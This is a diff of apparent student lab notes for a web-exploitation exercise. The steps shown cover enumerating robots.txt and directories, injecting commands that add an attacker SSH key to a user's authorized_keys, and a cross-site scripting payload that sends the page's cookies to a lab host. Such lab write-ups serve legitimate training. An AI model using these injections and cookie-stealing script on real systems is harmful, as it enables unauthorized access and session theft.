@@ -84,9 +84,11 @@ firefox
 127.0.0.1:1111
 ```
 * Enumerating the directories
+
 -------- /robots.txt: ------------------------------------------------------------
-	* from your nmap --script http-enum, you enumerated the robots.txt file.
-	* try accessing that file from the web-browser
+	
+* from your nmap --script http-enum, you enumerated the robots.txt file.
+* try accessing that file from the web-browser
 ```
 http://127.0.0.1:1111/robots.txt
 ```
@@ -95,8 +97,10 @@ http://127.0.0.1:1111/robots.txt
 User-agent: *
 Disallow: /net_test	
 ```
+
 -------- /css -------------------------------------------------------------------
-	* Now look at the other 3 directories that your nmap script found:
+
+* Now look at the other 3 directories that your nmap script found:
 ```
 http://127.0.0.1:1111/css
 ```
@@ -117,7 +121,9 @@ Index of /css
 [IMG]	ui-icons_cc0000_256x240.png	2022-03-23 14:33 	4.4K	 
 [IMG]	ui-icons_ffffff_256x240.png	2022-03-23 14:33 	6.2K	 
 ```
+
 -------- /images -----------------------------------------------------------------
+
 ```
 http://127.0.0.1:1111/images
 ```
@@ -130,7 +136,9 @@ Index of /images
 [IMG]	sign.jpeg	2022-03-23 14:33 	10K	 
 Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 1111
 ```
+
 -------- /uploads ----------------------------------------------------------------
+
 ```
 http://127.0.0.1:1111/uploads
 ```
@@ -151,8 +159,10 @@ I took my online training from the following website
 
 10.100.28.55
 ```
+
 -------- /net_test -----------------------------------------------------------------
-	* check the /net_test directory:
+
+* check the /net_test directory:
 ```
 http://127.0.0.1:1111/net_test
 ```
@@ -214,8 +224,8 @@ billybob:x:1001:1001:you found me watkTNrQG4K8go2baNbj:/home/billybob:/bin/bash
 
 ---------------------------------------------------------------------------------------------------------------------------------------------
 
-	* after you determine the user's home directory, check to see if they have a .ssh directory:
-	* if not, make one:
+* after you determine the user's home directory, check to see if they have a .ssh directory:
+* if not, make one:
 ```
 ; mkdir /home/billybob/.ssh
 ```
@@ -238,6 +248,7 @@ cat /home/student/.ssh/id_rsa.pub
 ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8Ny133z4AEchrClekmxkUtlWrflXcGT8JBygIkkm/Cy7AyZ+U/Sx9YWXrYft9R0GRE/CcJpQfJJhPp0juq+Zc+vYQ73bdOf3duEZjPRTzMiibq8wOpiguT5kJ1jBs6WYqdyuWUO61Re1b1rFAcZsxz26t3S+8+ycYWyYTDthO5ugSXdXmpy9PIHUcb5ogvT0wpIOxLaVyZhlzm6CadP7iklvJAXRXqDeReKU2XdCPpKZb3awt0g4SU7d4Z6od5wR1xGgYwCpAfCpttUnyk5cgVr2YGjvpY4ExkMYSFvZmA2ENXH/3WDpx3I31/DBeGSbIAOqvTUIMGy3kmxQDKp/p student@lin-ops" >> /home/billybob/.ssh/authorized_keys
 ```
 -----------------------------------------------------------------------------------------------------------------------------------------
+
 # on lin-ops
 * make a new socket, and ssh into the web server, and loggon
 - sednig private key to encrypt the begging of the conversation. This allows the client to authenticate.
@@ -248,6 +259,7 @@ cat /home/student/.ssh/id_rsa.pub
 * Congrats, you did a ssh  masquerade
 
 -----------------------------------------------------------------------------
+
 # on web server: 
 * Directory Traversal via HTTP POST/GET methods:
 ```
@@ -270,11 +282,11 @@ python3 -m http.server
 ```
 ----------------------------------------------
 
-	* then put script on webpage
+* then put script on webpage
 	
 ```
 <script>document.location="http://10.50.27.61:8000/?" + document.cookie;</script>
 ```
-			 		^ lin-ops {IP}10.50.27.61:8000
+*    lin-ops {IP}10.50.27.61:8000 ^^^^^^
 					
 
